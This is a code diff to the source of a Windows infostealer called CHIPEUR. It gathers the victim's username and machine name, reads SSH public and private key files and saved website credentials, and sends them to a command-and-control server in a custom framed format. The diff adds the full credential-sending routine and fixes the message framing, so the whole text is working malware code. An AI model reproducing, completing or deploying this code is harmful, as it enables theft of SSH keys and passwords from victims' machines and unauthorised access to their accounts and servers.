@@ -11,7 +11,7 @@
 #include "find_ssh_key.h"
 #include "obfuscation.h"
 #include "extract_file.h"
-#include "login.h"
+#include "logins.h"
 
 BOOL connect_to_c2(SOCKET *sock) {
   // Create the socket and establish the connection to the C2 server.
@@ -67,7 +67,7 @@ static BOOL close_c2_conn(SOCKET *sock) {
 
 static PWSTR get_header(void) {
   // [CHIPEUR] + 'username@machinename' is the header of a message to the C2
-
+  // the caller shall free the PWSTR returned
   int err;
   WCHAR machineName[MAX_COMPUTERNAME_LENGTH + 1] = {0};
   DWORD lenMachineName = MAX_COMPUTERNAME_LENGTH + 1;
@@ -87,6 +87,7 @@ static PWSTR get_header(void) {
            GetLastError());
   }
 
+  // computing the full header
   int realSize = _snwprintf(fullName, lenFullName, L"[CHIPEUR]|%ls@%ls|",
                             userName, machineName);
   if (realSize == -1) {
@@ -144,7 +145,7 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
   Try to send all the ssh key files. If all the files are sent successfully, it
   returns TRUE. Otherwise, it returns FALSE. The sent format for ssh key file is
   the following :
-  [CHIPEUR]|<username>@<machinename>|file|<filenamePath>|<fileContent...>|[RUEPIHC]
+  [CHIPEUR]|<username>@<machinename>|file|<filenamePath>|<fileContent...>[RUEPIHC]
   */
   PWSTR header = get_header();
   PWSTR datatype = L"file|";
@@ -174,11 +175,13 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
             free(header);
             return FALSE;
         }
+        // sending the ssh public key
         if (send_file(keysTab[i].publicKeyPath, sock) == FALSE) {
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].publicKeyPath);
             success = FALSE;
         }
-        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 10, 0);
+        // sending the tail of the request
+        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 11, 0);
         if (err == SOCKET_ERROR) {
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
             free(headTypeFname);
@@ -208,11 +211,13 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
             free(header);
             return FALSE;
         }
+        // sending the ssh secret file
         if (send_file(keysTab[i].secretKeyPath, sock) == FALSE) {
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send file '%ls'\n", keysTab[i].secretKeyPath);
             success = FALSE;
         }
-        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 10, 0);
+        // senfing the tail of the request
+        err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 11, 0);
         if (err == SOCKET_ERROR) {
             fwprintf(stderr, L"DEBUG: send_ssh_key: Couldn't send end of request: %d\n", GetLastError());
             free(headTypeFname);
@@ -230,7 +235,7 @@ BOOL send_ssh_key(sshKey keysTab[MAX_KEY_FILES], DWORD32 lenKeysTab,
 
 BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
   // Function that send the credentials to the c2 server
-  // [CHIPEUR]|<username>@<machinename>|credentials|url1,username1,password1\n...\nurlN,usernameN,passwordN|[RUEPIHC]
+  // [CHIPEUR]|<username>@<machinename>|credentials|url1,username1,password1\n...\nurlN,usernameN,passwordN[RUEPIHC]
   PWSTR header = get_header();
   size_t lenHeader = wcslen(header);
   PWSTR datatype = L"credentials|";
@@ -238,12 +243,46 @@ BOOL send_credentials(SOCKET * sock, Credential * credTab, DWORD32 lenCredTab){
   PWSTR headType = malloc(sizeof(WCHAR) * lenHeadType);
   if (headType == NULL){
     fprintf(stderr, "DEBUG: send_credentials: Error, couldn't allocate the headType");
+    free(header);
     return FALSE;
   }
   
+  // sending the header
   _snwprintf(headType, lenHeadType, L"%ls%ls", header, datatype);
+  free(header);
+  int err = send(*sock, (char *)headType, lenHeadType * 2, 0);
+  if (err == SOCKET_ERROR){
+    fwprintf(stderr, L"DEBUG: send_credentials: Couldn't send header: %d\n", GetLastError());
+    free(headType);
+  }
+  free(headType);
 
-  wprintf(L"%ls\n");
+  // sending the credentials
+  for (DWORD i = 0; i < lenCredTab; i++){
+    char * credToSend = NULL;
+    DWORD32 lenCredToSend = strlen(credTab[i].url) + strlen(credTab[i].username) + strlen(credTab[i].password) + 4;
+    credToSend = malloc(sizeof(char) * (lenCredToSend + 1));
+    credToSend[lenCredToSend] = 0;
+    if (credToSend == NULL){
+      fwprintf(stderr, L"DEBUG: send_credentials: Couldn't allocate credentials to send\n");
+      break;
+    }
 
+    snprintf(credToSend, lenCredToSend, "%s,%s,%s\n", credTab[i].url, credTab[i].username, credTab[i].password);
+    err = send(*sock, credToSend, lenCredToSend, 0);
+    free(credToSend);
+    if (err == SOCKET_ERROR){
+      fwprintf(stderr, L"DEBUG: send_credentials: Couldn't send header: %d\n", GetLastError());
+      break;
+    }
+  }
+
+  // sending the tail of the request
+  err = send(*sock, "[RUEPIHC]\n", sizeof(char) * 11, 0);
+  if (err == SOCKET_ERROR) {
+      fwprintf(stderr, L"DEBUG: send_credentials: Couldn't send end of request: %d\n", GetLastError());
+      return FALSE;
+  }
+  printf("DEBUG: send_credentials: Credentials sent successfully\n");
   return TRUE;
 }
